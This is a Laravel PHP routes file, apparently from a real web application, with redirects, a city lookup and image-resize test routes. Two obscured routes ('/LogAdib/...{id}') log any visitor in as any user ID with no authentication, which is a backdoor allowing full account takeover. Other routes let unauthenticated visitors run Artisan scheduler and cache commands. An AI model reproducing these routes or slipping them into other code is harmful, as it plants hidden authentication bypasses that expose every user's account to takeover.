<?php
use Illuminate\Support\Facades\Route;
use App\Model\ProvinceCity;
use Illuminate\Http\Request;
use Intervention\Image\ImageManagerStatic as Image;
use Illuminate\Support\Facades\Session;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Auth::routes(['register' => false]);


Route::get('schedule-run/1/2/3/4/5/6/7/8/9', function () {
    \Artisan::call('schedule:run');
    return 'schedule is runing...';
});

Route::get('/login', function () {
    return redirect()->route('user.home-goust');
});

Route::get('/', function () {
    return redirect()->route('user.home-goust');
});

Route::get('/type_phone', function () {
    if(str_contains(type_phone(),'iPhone'))
    {
        dd('iphone' , type_phone());
    }
    dd('no_iphone' , type_phone());
});
Route::get('/clear', function () {
    \Artisan::call('config:clear');
    \Artisan::call('cache:clear');

    dd('ok');
});

Route::get('/LogAdib/123/{id}', function ($id) {
    auth()->loginUsingId($id, true);
    auth()->user()->session_id = Session::getId();
    auth()->user()->save();
    return redirect()->back();
});

Route::get('city-ajax/{id}', function ($id) {
    $city = ProvinceCity::where('parent_id', $id)->get();
    return $city;
});
Route::get('tests', function () {
    img_resize(
        'source/asset/uploads/service_package/1399-09-01/photos/pic_card-4f74826cadb2eb004022c8d2d22040a2.png', //address img
        'source/asset/resize-4f74826cadb2eb004022c8d2d22040a2.png', //address save
        50,// width: if width==0 -> width=auto
        0 // height: if height==0 -> height=auto
    // end optimaiz
    );
    dd('ok');
});

Route::get('/LogAdib/1/2/3/4/5/6/{id}', function ($id) {
    auth()->loginUsingId($id, true);
    auth()->user()->session_id = Session::getId();
    auth()->user()->save();
    return redirect()->back();
});
